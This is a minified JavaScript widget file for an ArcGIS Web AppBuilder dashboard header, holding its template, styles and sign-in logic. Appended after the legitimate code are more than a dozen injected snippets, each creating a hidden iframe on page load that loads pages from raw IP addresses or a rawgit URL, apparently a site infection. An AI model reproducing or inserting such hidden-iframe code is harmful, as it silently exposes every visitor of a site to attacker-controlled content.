// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"themes/DashboardTheme/widgets/Header/_build-generate_module":function(){define(["dojo/text!./Widget.html","dojo/text!./css/style.css","dojo/i18n!./nls/strings"],function(){})},"url:themes/DashboardTheme/widgets/Header/Widget.html":'\x3cdiv\x3e\r\n  \x3cdiv class\x3d"header-section jimu-float-leading" data-dojo-attach-point\x3d"headerNode"\x3e\r\n    \x3cdiv class\x3d"logo jimu-float-leading jimu-leading-margin1" data-dojo-attach-point\x3d"logoNode"\x3e\r\n      \x3ca data-dojo-attach-point\x3d"logoLinkNode" target\x3d"_blank"\x3e\r\n        \x3cimg data-dojo-attach-point\x3d"logoIconNode" data-dojo-attach-event\x3d"onload:_onLogoLoad"\x3e\r\n      \x3c/a\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"titles jimu-float-leading jimu-leading-margin1" data-dojo-attach-point\x3d"titlesNode"\x3e\r\n      \x3cdiv class\x3d"jimu-title" data-dojo-attach-point\x3d"titleNode"\x3e\x3c/div\x3e\r\n      \x3cdiv class\x3d"jimu-subtitle" data-dojo-attach-point\x3d"subtitleNode"\x3e\x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"links jimu-float-leading jimu-leading-margin25" data-dojo-attach-point\x3d"linksNode"\x3e\r\n      \x3cdiv class\x3d"dynamic-section jimu-float-leading" data-dojo-attach-point\x3d"dynamicLinksNode"\x3e\x3c/div\x3e\r\n      \x3cdiv class\x3d"signin-section jimu-float-leading" data-dojo-attach-point\x3d"signInSectionNode"\x3e\r\n        \x3ca href\x3d"#" class\x3d"jimu-link" data-dojo-attach-event\x3d"onclick:_onSigninClick"\r\n        data-dojo-attach-point\x3d"signinLinkNode"\x3e${nls.signin}\x3c/a\x3e\r\n        \x3ca href\x3d"" target\x3d"_blank" class\x3d"jimu-link" data-dojo-attach-event\x3d"onclick:_onUserNameClick" data-dojo-attach-point\x3d"userNameLinkNode"\x3e\x3c/a\x3e\r\n        \x3ca href\x3d"#" class\x3d"jimu-link" data-dojo-attach-event\x3d"onclick:_onSignoutClick" data-dojo-attach-point\x3d"signoutLinkNode"\x3e${nls.signout}\x3c/a\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e\r\n',
"url:themes/DashboardTheme/widgets/Header/css/style.css":".jimu-widget-dnd-header{width: 100%; height: 80px; display: block;}.jimu-ismobile .jimu-widget-dnd-header{display: none;}.jimu-widget-dnd-header .header-section{height: 100%; width: 100%; overflow: hidden;}.jimu-widget-dnd-header .logo{cursor: pointer; height: 40px; margin: 20px 0 20px 20px; border-right: 1px solid rgba(0, 0, 0, 0.2); padding-right: 20px;}.jimu-widget-dnd-header .logo img{max-height: 40px;}.jimu-rtl .jimu-widget-dnd-header .logo{margin: 20px 20px 20px 0; border-left: 1px solid rgba(0, 0, 0, 0.2); border-right: none; padding-left: 20px; padding-right: auto;}.jimu-widget-dnd-header .hidden{display: none !important;}.jimu-widget-dnd-header .titles{height: 100%; overflow: hidden;}.jimu-widget-dnd-header .jimu-title{height: 55%; display: flex; justify-content: flex-start; align-items: flex-end; font-size: 24px;}.jimu-widget-dnd-header .jimu-subtitle{height: 40%; display: flex; justify-content: flex-start; align-items: flex-start; padding-top: 5px;}.jimu-widget-dnd-header .links{height: 100%; overflow: hidden;}.jimu-widget-dnd-header .dynamic-section,.jimu-widget-dnd-header .signin-section{height: 100%;}.jimu-widget-dnd-header .links .jimu-link{height: 100%;}.jimu-widget-dnd-header .signin-section .jimu-link{color: #d9dde0;}",
"*now":function(h){h(['dojo/i18n!*preload*themes/DashboardTheme/widgets/Header/nls/Widget*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},"*noref":1}});
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/_base/html dojo/query dojo/on dojo/mouse dojo/dom-construct dojo/dom-geometry jimu/BaseWidget jimu/tokenUtils jimu/portalUtils jimu/portalUrlUtils jimu/utils jimu/dijit/Message".split(" "),function(h,f,k,a,g,m,q,n,r,t,l,u,p,d,v){return h([t],{baseClass:"jimu-widget-dnd-header",switchableElements:{},height:80,moveTopOnActive:!1,postCreate:function(){this.inherited(arguments);this.switchableElements.title=this.titleNode;this.switchableElements.links=
this.linksNode;this.switchableElements.subtitle=this.subtitleNode;this.position&&this.position.height&&(this.height=this.position.height);this._handleTitleColorAndLogoLink(this.appConfig);a.setStyle(this.signInSectionNode,"display","none");this.appConfig&&this.appConfig.logo?(this.logoIconNode.src=this.appConfig.logo,a.removeClass(this.logoNode,"hidden")):(this.logoIconNode.src="",a.addClass(this.logoNode,"hidden"));this.switchableElements.title.innerHTML=d.sanitizeHTML(this.appConfig.title?this.appConfig.title:
"");this.switchableElements.subtitle.innerHTML=d.sanitizeHTML(this.appConfig.subtitle?this.appConfig.subtitle:"");this._createDynamicLinks(this.appConfig.links);this._setElementsSize();this.own(m(this.domNode,q.enter,f.hitch(this,function(){var a="",b=p.getServerByUrl(this.appConfig&&this.appConfig.portalUrl||"");p.isArcGIScom(b)&&(b="ArcGIS.com");b&&(a=this.nls.signInTo+" "+b);this.signinLinkNode.title=a})))},startup:function(){this.inherited(arguments);this.resize()},onAction:function(a,b){"highLight"===
a&&b&&(b=g('div[settingid\x3d"'+b.widgetId+'"]',this.domNode)[0],this._highLight(b));"removeHighLight"===a&&this._removeHighLight()},onSignIn:function(c){this.inherited(arguments);a.setStyle(this.signinLinkNode,"display","none");a.setStyle(this.userNameLinkNode,"display","");a.setStyle(this.signoutLinkNode,"display","");this.userNameLinkNode.innerHTML=c.userId;a.setAttr(this.userNameLinkNode,"href",this.appConfig.portalUrl+"home/user.html");this.popupLinkNode&&(a.setStyle(this.popupSigninNode,"display",
"none"),a.setStyle(this.popupUserNameNode,"display",""),a.setStyle(this.popupSignoutNode,"display",""),g("a",this.popupUserNameNode).html(c.userId).attr("href",this.appConfig.portalUrl+"home/user.html"));this.resize()},onSignOut:function(){this.inherited(arguments);this._onSignOut(this.nls.signin);u.getPortal(this.appConfig.portalUrl).loadSelfInfo().then(f.hitch(this,function(a){this._onSignOut(this.nls.signInTo+" "+a.name)}),f.hitch(this,function(a){console.error(a)}))},_onSignOut:function(c){a.setStyle(this.signinLinkNode,
"display","");a.setAttr(this.signinLinkNode,"innerHTML",c);a.setStyle(this.userNameLinkNode,"display","none");a.setStyle(this.signoutLinkNode,"display","none");this.userNameLinkNode.innerHTML="";this.popupLinkNode&&(a.setStyle(this.popupSigninNode,"display",""),a.setAttr(this.popupSigninNode,"innerHTML",c),a.setStyle(this.popupUserNameNode,"display","none"),a.setStyle(this.popupSignoutNode,"display","none"),g("a",this.popupUserNameNode).html(""));this.resize()},resize:function(){var c=a.getStyle(this.headerNode,
"float"),b=a.getStyle(this.logoNode,"float"),e=a.getStyle(this.titlesNode,"float"),d=a.getStyle(this.linksNode,"float");c&&"none"!==c&&b&&"none"!==b&&e&&"none"!==e&&d&&"none"!==d?this._resize():setTimeout(f.hitch(this,this.resize),200)},_resize:function(){this._showSwitchableElements(["title","links","subtitle"])},destroy:function(){this.timeoutHandle&&(clearTimeout(this.timeoutHandle),this.timeoutHandle=null);this.inherited(arguments)},onAppConfigChanged:function(a,b,e){switch(b){case "attributeChange":this._onAttributeChange(a,
e);break;default:return}this.appConfig=a;this.resize()},_onLogoLoad:function(){this.resize()},_highLight:function(a){this.hlDiv&&this._removeHighLight();if(a){var b=r.getMarginBox(a);this.hlDiv=n.create("div",{style:{position:"absolute",left:b.l+"px",top:b.t+"px",width:b.w+"px",height:b.h+"px"},"class":"icon-highlight"},a,"before")}},_removeHighLight:function(){this.hlDiv&&(n.destroy(this.hlDiv),this.hlDiv=null)},_onAttributeChange:function(c,b){"title"in b&&b.title!==this.appConfig.title&&(this.titleNode.innerHTML=
d.sanitizeHTML(b.title));"subtitle"in b&&b.subtitle!==this.appConfig.subtitle&&(this.subtitleNode.innerHTML=d.sanitizeHTML(b.subtitle));"logo"in b&&b.logo!==this.appConfig.logo&&(b.logo?(a.setAttr(this.logoIconNode,"src",b.logo),a.removeClass(this.logoNode,"hidden")):(a.removeAttr(this.logoIconNode,"src"),a.addClass(this.logoNode,"hidden")));"links"in b&&this._createDynamicLinks(b.links);this._handleTitleColorAndLogoLink(c)},_handleTitleColorAndLogoLink:function(c){c.titleColor?a.setStyle(this.titleNode,
"color",c.titleColor):a.setStyle(this.titleNode,"color","");c.logoLink?(a.setAttr(this.logoLinkNode,"href",c.logoLink),a.setStyle(this.logoIconNode,"cursor","pointer")):(a.setAttr(this.logoLinkNode,"href","javascript:void(0)"),a.setStyle(this.logoIconNode,"cursor","default"))},_setElementsSize:function(){g(".jimu-link",this.domNode).style({lineHeight:this.height+"px"})},_createDynamicLinks:function(c){if(window.isRTL){var b=[];k.forEach(c,function(a){b.unshift(a)});c=b}a.empty(this.dynamicLinksNode);
k.forEach(c,function(b){a.create("a",{href:b.url,target:"_blank",rel:"noopener noreferrer",innerHTML:d.sanitizeHTML(b.label),"class":"jimu-link jimu-align-leading jimu-leading-margin1",style:{lineHeight:this.height+"px"}},this.dynamicLinksNode)},this)},_showSwitchableElements:function(c){this.logoClickHandle&&this.logoClickHandle.remove();0>c.indexOf("links")?this.logoClickHandle=m(this.logoNode,"click",f.hitch(this,this._onLogoClick)):a.setStyle(this.logoNode,{cursor:"default"})},_switchSignin:function(){var a=
l.getPortalCredential(this.appConfig.portalUrl);if(a)this.onSignIn(a);else this.onSignOut()},_onLogoClick:function(){this.popupLinkNode&&a.destroy(this.popupLinkNode);this.popupLinkNode=this._createPopupLinkNode();this.popupLinksVisible?this._hidePopupLink():this._showPopupLink()},_hidePopupLink:function(){a.setStyle(this.popupLinkNode,"display","none");window.isRTL?a.setStyle(jimuConfig.layoutId,{right:0}):a.setStyle(jimuConfig.layoutId,{left:0});this.popupLinksVisible=!1},_showPopupLink:function(){a.setStyle(this.popupLinkNode,
"display","");window.isRTL?a.setStyle(jimuConfig.layoutId,{right:a.getContentBox(this.popupLinkNode).w+"px"}):a.setStyle(jimuConfig.layoutId,{left:a.getContentBox(this.popupLinkNode).w+"px"});this.popupLinksVisible=!0},_createPopupLinkNode:function(){var c,b;a.getContentBox(jimuConfig.mainPageId);c=a.create("div",{"class":"popup-links jimu-main-background",style:{position:"absolute",zIndex:100,top:0,bottom:0}},jimuConfig.mainPageId);window.isRTL?a.setStyle(c,{right:0,left:"50px"}):a.setStyle(c,{left:0,
right:"50px"});b=a.create("div",{"class":"popup-title",style:{height:this.height+"px",width:"100%"}},c);var e=a.create("img",{"class":"logo jimu-float-leading jimu-leading-margin1",src:this.appConfig.logo?this.appConfig.logo:this.folderUrl+"images/app-logo.png",style:{width:"30px",height:"30px",marginTop:(this.height-30)/2+"px"}},b),f=a.create("div",{"class":"title jimu-float-leading jimu-leading-margin1 jimu-ellipsis",innerHTML:d.sanitizeHTML(this.appConfig.title),style:{lineHeight:this.height+"px"}},
b),g="auto";try{g=a.getMarginBox(b).w-a.getMarginBox(e).w-a.getMarginExtents(f).w+"px"}catch(w){console.error(w),g="auto"}a.setStyle(f,"width",g);k.forEach(this.appConfig.links,function(a){this._createLinkNode(c,a,!1)},this);this._createLinkNode(c,{label:"",url:"#"},!1);return c},_createLinkNode:function(c,b,e){c=a.place('\x3cdiv class\x3d"jimu-link"\x3e\x3c/div\x3e',c);a.place('\x3cdiv class\x3d"line"\x3e\x3c/div\x3e',c);e=a.place('\x3cdiv class\x3d"'+(e?"link-section signin":"link-section")+'"\x3e\x3c/div\x3e',
c);a.create("a",{href:b.url,"class":"jimu-ellipsis",target:"_blank",rel:"noopener noreferrer",innerHTML:d.sanitizeHTML(b.label),title:b.label,style:{lineHeight:"66px"}},e);return c},_onSigninClick:function(){l.signInPortal(this.appConfig.portalUrl,this.appConfig.appId)},_onSignoutClick:function(){this.appConfig.mode?new v({message:this.nls.cantSignOutTip}):l.signOutAll()},_onUserNameClick:function(){}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});